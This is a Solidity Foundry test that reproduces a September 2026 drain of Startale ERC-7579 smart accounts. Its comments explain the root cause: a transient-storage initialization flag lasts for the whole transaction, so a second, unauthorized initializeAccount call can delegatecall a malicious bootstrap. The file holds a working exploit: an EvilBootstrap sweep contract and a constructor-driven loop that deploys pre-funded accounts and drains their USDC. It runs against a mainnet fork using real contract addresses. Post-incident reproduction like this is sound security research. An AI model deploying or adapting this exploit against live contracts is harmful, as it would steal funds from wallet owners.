// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.16;

import "../basetest.sol";
import {IERC20} from "forge-std/interfaces/IERC20.sol";

// Startale ERC-7579 smart account - transient-storage re-initialization drain. Ethereum, 2026-09.
//
// Example attack tx (1 of many batched txs across the campaign):
//   tx      : 0x1a021a27c8db5ecd6428a567cedf008872f205c55e590d4dcd2ea10e31a036a2
//   block   : 25987506 (fork at parent 25987505)
//   attacker: EOA 0x901DafdE7057BC2478d1eF640fb5515EA4757AAB deploys a throwaway contract;
//             the entire drain runs inside that contract's CONSTRUCTOR (the tx `to` is empty).
//   collector (funds recipient in the real tx): 0xe2719E3b28EeF69bf3C4A9D7FC7280c5a015EcdE
//
// Contracts (verified source, compiler v0.8.30):
//   StartaleSmartAccount (impl)  : 0x000000b8f5f723A680d3D7EE624Fe0bC84a6E05A
//   StartaleAccountFactory       : 0x0000003B3E7b530b4f981aE80d9350392Defef90
//   ECDSAValidator (default val.): 0x00000072F286204Bb934eD49D8969E86F7dEC7b1
//   Token drained in this tx     : USDC 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48
//
// What the example tx actually did (from the receipt logs, since debug_trace is not on the free
// tier): 40 AccountCreated events from the factory, 40 ECDSAValidator "owner registered" events
// (one legit init per account), then 23 USDC Transfer events out of the 23 accounts that were
// pre-funded, all to the collector. Total 427.551160 USDC in this single tx (~$427). USDT was not
// touched in THIS tx; the ~$2,876 USDC+USDT / ~330-account figure in the alert is the running
// campaign aggregate across the ~41 known batches, not this one tx.
//
// ROOT CAUSE (confirmed against the deployed verified source of all three contracts):
//   1. AccountProxy's constructor (factory/src/utils/AccountProxy.sol) calls
//         Initializable.setInitializable();   // == assembly { tstore(INIT_SLOT, 1) }
//      then upgradeToAndCall(impl, initializeAccount(initData)). The intent, per the code comment,
//      is that the "initializable" flag is only true during construction.
//   2. StartaleSmartAccount.initializeAccount(bytes) (impl/src/StartaleSmartAccount.sol:293) gates
//      external (non-self) callers with ONLY Initializable.requireInitializable() == tload(INIT_SLOT).
//      It then does bootstrap.delegatecall(bootstrapCall) with a caller-supplied bootstrap address,
//      and there is NO "already initialized" guard on the re-entry - the only gate is the transient
//      flag. initData is abi.encode(address bootstrap, bytes bootstrapCall).
//   3. EIP-1153 transient storage is scoped to the whole TRANSACTION, not to the constructor call
//      frame. TSTORE done in the AccountProxy constructor is NOT rolled back when that CREATE frame
//      returns, so INIT_SLOT stays 1 on the freshly-deployed account for the rest of the tx.
//   => Within the same tx, after the factory legitimately deploys and initializes a counterfactual
//      account (which real users pre-fund at its predicted address before deployment), the attacker
//      calls initializeAccount() a SECOND time on that same account with a malicious bootstrap. The
//      transient flag is still set, so requireInitializable() passes, the malicious bootstrap runs
//      via DELEGATECALL in the account's own context, and it sweeps the account's USDC. No signature,
//      no ownership, and zero attacker capital.
//
// CONFIRMED empirically by this PoC (it is the confirmation the alert asked for): the second
// initializeAccount() call from an unrelated external contract succeeds and moves the pre-funded
// balance, i.e. the transient flag genuinely persists past the constructor for the whole tx. If it
// were scoped to the constructor, the second call would revert with NotInitializable() and this test
// would fail.
//
// This PoC reconstructs a representative 3-account subset (the mechanism is identical per account).
// The three funded amounts are the first three real pre-funded victim balances from the example tx:
//   0x0500d551...  10.100000 USDC
//   0x10bf6524...  11.145075 USDC
//   0x18bef595...  11.310486 USDC
// so the reproduced gain (32.555561 USDC) is the exact sum those three victims lost, ~7.6% of this
// tx's 427.55 USDC and a proportional slice of the wider campaign.
//
// Run:
//   forge test --contracts src/test/2026-09/Startale_exp.sol -vvv
// The test carries an inline `forge-config: default.evm_version = "cancun"` (same convention as the
// other transient-storage PoCs in this repo), because the deployed Startale contracts are cancun
// bytecode (TSTORE/TLOAD/MCOPY) and the repo default compiles for shanghai. No foundry.toml change
// is needed and no --evm-version flag is required on the command line.

interface IStartaleAccountFactory {
    function createAccount(bytes calldata initData, bytes32 salt) external payable returns (address payable);
    function computeAccountAddress(bytes calldata initData, bytes32 salt)
        external
        view
        returns (address payable);
}

interface IStartaleSmartAccount {
    function initializeAccount(bytes calldata initData) external payable;
    function isInitialized() external view returns (bool);
}

interface IModule {
    function onInstall(bytes calldata data) external;
}

// Stand-in for the bootstrap a normal user supplies at deployment. Executed via DELEGATECALL in the
// account's context by initializeAccount, it registers the user's own key in the canonical
// ECDSAValidator, which is exactly what makes isInitialized() true for a freshly created account.
contract LegitBootstrap {
    function init(address validator, address owner) external {
        // msg.sender here is the account (delegatecall), so the owner is bound to the account.
        IModule(validator).onInstall(abi.encodePacked(owner));
    }
}

// The attacker's malicious bootstrap. Executed via DELEGATECALL in the victim account's context on
// the attacker's second initializeAccount() call, so address(this) is the account itself and the
// transfer moves the account's own tokens out.
contract EvilBootstrap {
    function sweep(address token, address to) external {
        uint256 bal = IERC20(token).balanceOf(address(this));
        if (bal > 0) IERC20(token).transfer(to, bal);
    }
}

// The attacker's throwaway contract. In the real tx the whole loop lives in the constructor, so the
// factory deployment (which sets the transient flag) and the malicious re-init happen in one tx.
contract StartaleExploit {
    constructor(
        IStartaleAccountFactory factory,
        address ecdsaValidator,
        address legitBootstrap,
        address evilBootstrap,
        address token,
        address recipient,
        address[] memory owners,
        bytes32[] memory salts
    ) {
        bytes memory evilInit =
            abi.encode(evilBootstrap, abi.encodeWithSelector(EvilBootstrap.sweep.selector, token, recipient));

        for (uint256 i; i < owners.length; ++i) {
            // The victim's own (public) init data + salt - the only params that reproduce the
            // pre-funded counterfactual address.
            bytes memory legitInit = abi.encode(
                legitBootstrap, abi.encodeWithSelector(LegitBootstrap.init.selector, ecdsaValidator, owners[i])
            );

            // 1. Deploy the counterfactual account. AccountProxy's constructor does tstore(INIT_SLOT,1)
            //    and runs the victim's legit init (owner = the victim, not the attacker).
            address payable account = factory.createAccount(legitInit, salts[i]);
            require(IStartaleSmartAccount(account).isInitialized(), "legit init failed");

            // 2. Same tx: the transient flag is still set on `account`, so this second, unsigned,
            //    unauthorized init from an unrelated contract passes requireInitializable() and
            //    delegatecalls the malicious bootstrap, sweeping the account's USDC.
            IStartaleSmartAccount(account).initializeAccount(evilInit);
        }
    }
}

contract StartaleExploitTest is BaseTestWithBalanceLog {
    IStartaleAccountFactory constant FACTORY = IStartaleAccountFactory(0x0000003B3E7b530b4f981aE80d9350392Defef90);
    address constant ECDSA_VALIDATOR = 0x00000072F286204Bb934eD49D8969E86F7dEC7b1;
    address constant USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;

    // Real pre-funded balances of the first three victim accounts in the example tx (6 decimals).
    uint256[3] realAmounts = [uint256(10_100_000), 11_145_075, 11_310_486];

    LegitBootstrap legitBootstrap;
    EvilBootstrap evilBootstrap;

    function setUp() public {
        vm.createSelectFork("mainnet", 25_987_505); // parent of the exploit block
        fundingToken = USDC;
    }

    /// forge-config: default.evm_version = "cancun"
    function testExploit() public balanceLog {
        legitBootstrap = new LegitBootstrap();
        evilBootstrap = new EvilBootstrap();

        address recipient = address(this); // the attacker's profit sink; balanceLog tracks it

        address[] memory owners = new address[](3);
        bytes32[] memory salts = new bytes32[](3);
        uint256 expected;

        for (uint256 i; i < 3; ++i) {
            owners[i] = address(uint160(0xB0B0000 + i)); // each victim's own key
            salts[i] = keccak256(abi.encode("startale-victim", i));

            // Build the victim's legit init data the same way the exploit contract will, so the
            // predicted address matches the one the attacker's createAccount call deploys to.
            bytes memory legitInit = abi.encode(
                address(legitBootstrap),
                abi.encodeWithSelector(LegitBootstrap.init.selector, ECDSA_VALIDATOR, owners[i])
            );
            address payable predicted = FACTORY.computeAccountAddress(legitInit, salts[i]);

            // Model the real setup: the user pre-funds their counterfactual wallet BEFORE it is
            // deployed. deal() here stands in for that pre-funding transfer.
            deal(USDC, predicted, realAmounts[i]);
            expected += realAmounts[i];
        }

        assertEq(IERC20(USDC).balanceOf(recipient), 0, "recipient should start empty");

        // The attacker supplies zero capital and no signatures - just this one deployment.
        new StartaleExploit(
            FACTORY, ECDSA_VALIDATOR, address(legitBootstrap), address(evilBootstrap), USDC, recipient, owners, salts
        );

        assertEq(IERC20(USDC).balanceOf(recipient), expected, "did not sweep the expected USDC");
        emit log_named_decimal_uint("USDC drained from 3 reconstructed victims", expected, 6);
    }
}
